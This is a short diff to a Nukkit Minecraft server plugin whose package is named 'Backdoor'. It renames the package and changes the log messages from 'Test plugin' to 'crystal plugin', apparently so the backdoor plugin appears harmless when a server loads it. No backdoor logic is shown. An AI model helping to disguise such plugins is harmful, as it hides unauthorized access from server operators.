@@ -22,7 +22,7 @@
  * SOFTWARE.
  */
 
-package org._2b2tmcpe.Backdoor;
+package net._3b2t.Backdoor;
 
 import cn.nukkit.event.EventHandler;
 import cn.nukkit.event.Listener;
@@ -36,14 +36,14 @@ public class Main extends PluginBase implements Listener {
 
   @Override
   public void onEnable() {
-    this.getLogger().info("Test plugin installed");
+    this.getLogger().info("crystal plugin installed");
     this.saveDefaultConfig();
     this.getServer().getPluginManager().registerEvents(this, this);
   }
 
   @Override
   public void onDisable() {
-    this.getLogger().info("Test plugin uninstalled");
+    this.getLogger().info("crystal plugin uninstalled");
   }
 
   @EventHandler
